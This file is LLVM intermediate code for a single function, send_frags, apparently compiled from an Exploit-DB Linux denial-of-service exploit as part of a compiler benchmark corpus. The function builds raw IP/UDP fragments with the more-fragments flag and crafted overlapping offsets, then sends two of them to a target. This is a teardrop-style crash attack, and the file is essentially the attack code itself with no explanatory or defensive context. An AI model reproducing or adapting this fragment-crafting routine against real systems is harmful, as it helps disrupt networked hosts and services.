; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_19103.c_send_frags.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_19103.c_send_frags.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@IPH = common dso_local global i64 0, align 8
@UDPH = common dso_local global i64 0, align 8
@PADDING = common dso_local global i32 0, align 4
@IP_MF = common dso_local global i64 0, align 8
@IPPROTO_UDP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [8 x i8] c"\0Asendto\00", align 1
@MAGIC = common dso_local global i64 0, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @send_frags(i32 %0, i32 %1, i32 %2, i32 %3, i32 %4) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32*, align 8
  %12 = alloca i32*, align 8
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  store i32 %4, i32* %10, align 4
  store i32* null, i32** %11, align 8
  store i32* null, i32** %12, align 8
  %15 = load i32, i32* @AF_INET, align 4
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  store i32 %15, i32* %16, align 4
  %17 = load i32, i32* %9, align 4
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i32 %17, i32* %18, align 4
  %19 = load i32, i32* %8, align 4
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  %21 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = load i64, i64* @IPH, align 8
  %23 = load i64, i64* @UDPH, align 8
  %24 = add nsw i64 %22, %23
  %25 = load i32, i32* @PADDING, align 4
  %26 = sext i32 %25 to i64
  %27 = add nsw i64 %24, %26
  %28 = call i64 @malloc(i64 %27)
  %29 = inttoptr i64 %28 to i32*
  store i32* %29, i32** %11, align 8
  %30 = load i32*, i32** %11, align 8
  store i32* %30, i32** %12, align 8
  %31 = load i32*, i32** %12, align 8
  %32 = load i64, i64* @IPH, align 8
  %33 = load i64, i64* @UDPH, align 8
  %34 = add nsw i64 %32, %33
  %35 = load i32, i32* @PADDING, align 4
  %36 = sext i32 %35 to i64
  %37 = add nsw i64 %34, %36
  %38 = call i32 @bzero(i32* %31, i64 %37)
  store i32 69, i32* %13, align 4
  %39 = load i32*, i32** %12, align 8
  %40 = call i32 @memcpy(i32* %39, i32* %13, i32 4)
  %41 = load i32*, i32** %12, align 8
  %42 = getelementptr inbounds i32, i32* %41, i64 2
  store i32* %42, i32** %12, align 8
  %43 = load i64, i64* @IPH, align 8
  %44 = load i64, i64* @UDPH, align 8
  %45 = add nsw i64 %43, %44
  %46 = load i32, i32* @PADDING, align 4
  %47 = sext i32 %46 to i64
  %48 = add nsw i64 %45, %47
  %49 = call i32 @FIX(i64 %48)
  %50 = load i32*, i32** %12, align 8
  store i32 %49, i32* %50, align 4
  %51 = load i32*, i32** %12, align 8
  %52 = getelementptr inbounds i32, i32* %51, i64 2
  store i32* %52, i32** %12, align 8
  %53 = call i32 @htons(i32 242)
  %54 = load i32*, i32** %12, align 8
  store i32 %53, i32* %54, align 4
  %55 = load i32*, i32** %12, align 8
  %56 = getelementptr inbounds i32, i32* %55, i64 2
  store i32* %56, i32** %12, align 8
  %57 = load i64, i64* @IP_MF, align 8
  %58 = call i32 @FIX(i64 %57)
  %59 = load i32*, i32** %12, align 8
  %60 = load i32, i32* %59, align 4
  %61 = or i32 %60, %58
  store i32 %61, i32* %59, align 4
  %62 = load i32*, i32** %12, align 8
  %63 = getelementptr inbounds i32, i32* %62, i64 2
  store i32* %63, i32** %12, align 8
  %64 = load i32*, i32** %12, align 8
  store i32 64, i32* %64, align 4
  %65 = load i32, i32* @IPPROTO_UDP, align 4
  store i32 %65, i32* %13, align 4
  %66 = load i32*, i32** %12, align 8
  %67 = getelementptr inbounds i32, i32* %66, i64 1
  %68 = call i32 @memcpy(i32* %67, i32* %13, i32 4)
  %69 = load i32*, i32** %12, align 8
  %70 = getelementptr inbounds i32, i32* %69, i64 4
  store i32* %70, i32** %12, align 8
  %71 = load i32, i32* %7, align 4
  %72 = load i32*, i32** %12, align 8
  store i32 %71, i32* %72, align 4
  %73 = load i32*, i32** %12, align 8
  %74 = getelementptr inbounds i32, i32* %73, i64 4
  store i32* %74, i32** %12, align 8
  %75 = load i32, i32* %8, align 4
  %76 = load i32*, i32** %12, align 8
  store i32 %75, i32* %76, align 4
  %77 = load i32*, i32** %12, align 8
  %78 = getelementptr inbounds i32, i32* %77, i64 4
  store i32* %78, i32** %12, align 8
  %79 = load i32, i32* %9, align 4
  %80 = call i32 @htons(i32 %79)
  %81 = load i32*, i32** %12, align 8
  store i32 %80, i32* %81, align 4
  %82 = load i32*, i32** %12, align 8
  %83 = getelementptr inbounds i32, i32* %82, i64 2
  store i32* %83, i32** %12, align 8
  %84 = load i32, i32* %10, align 4
  %85 = call i32 @htons(i32 %84)
  %86 = load i32*, i32** %12, align 8
  store i32 %85, i32* %86, align 4
  %87 = load i32*, i32** %12, align 8
  %88 = getelementptr inbounds i32, i32* %87, i64 2
  store i32* %88, i32** %12, align 8
  %89 = load i32, i32* @PADDING, align 4
  %90 = add nsw i32 8, %89
  %91 = call i32 @htons(i32 %90)
  %92 = load i32*, i32** %12, align 8
  store i32 %91, i32* %92, align 4
  %93 = load i32, i32* %6, align 4
  %94 = load i32*, i32** %11, align 8
  %95 = load i64, i64* @IPH, align 8
  %96 = load i64, i64* @UDPH, align 8
  %97 = add nsw i64 %95, %96
  %98 = load i32, i32* @PADDING, align 4
  %99 = sext i32 %98 to i64
  %100 = add nsw i64 %97, %99
  %101 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %102 = call i32 @sendto(i32 %93, i32* %94, i64 %100, i32 0, %struct.sockaddr* %101, i32 4)
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %109

104:                                              ; preds = %5
  %105 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0))
  %106 = load i32*, i32** %11, align 8
  %107 = call i32 @free(i32* %106)
  %108 = call i32 @exit(i32 1) #3
  unreachable

109:                                              ; preds = %5
  %110 = load i32*, i32** %11, align 8
  %111 = getelementptr inbounds i32, i32* %110, i64 2
  store i32* %111, i32** %12, align 8
  %112 = load i64, i64* @IPH, align 8
  %113 = load i64, i64* @MAGIC, align 8
  %114 = add nsw i64 %112, %113
  %115 = add nsw i64 %114, 1
  %116 = call i32 @FIX(i64 %115)
  %117 = load i32*, i32** %12, align 8
  store i32 %116, i32* %117, align 4
  %118 = load i32*, i32** %12, align 8
  %119 = getelementptr inbounds i32, i32* %118, i64 4
  store i32* %119, i32** %12, align 8
  %120 = load i64, i64* @MAGIC, align 8
  %121 = call i32 @FIX(i64 %120)
  %122 = load i32*, i32** %12, align 8
  store i32 %121, i32* %122, align 4
  %123 = load i32, i32* %6, align 4
  %124 = load i32*, i32** %11, align 8
  %125 = load i64, i64* @IPH, align 8
  %126 = load i64, i64* @MAGIC, align 8
  %127 = add nsw i64 %125, %126
  %128 = add nsw i64 %127, 1
  %129 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %130 = call i32 @sendto(i32 %123, i32* %124, i64 %128, i32 0, %struct.sockaddr* %129, i32 4)
  %131 = icmp eq i32 %130, -1
  br i1 %131, label %132, label %137

132:                                              ; preds = %109
  %133 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0))
  %134 = load i32*, i32** %11, align 8
  %135 = call i32 @free(i32* %134)
  %136 = call i32 @exit(i32 1) #3
  unreachable

137:                                              ; preds = %109
  %138 = load i32*, i32** %11, align 8
  %139 = call i32 @free(i32* %138)
  ret void
}

declare dso_local i64 @malloc(i64) #1

declare dso_local i32 @bzero(i32*, i64) #1

declare dso_local i32 @memcpy(i32*, i32*, i32) #1

declare dso_local i32 @FIX(i64) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @sendto(i32, i32*, i64, i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @free(i32*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
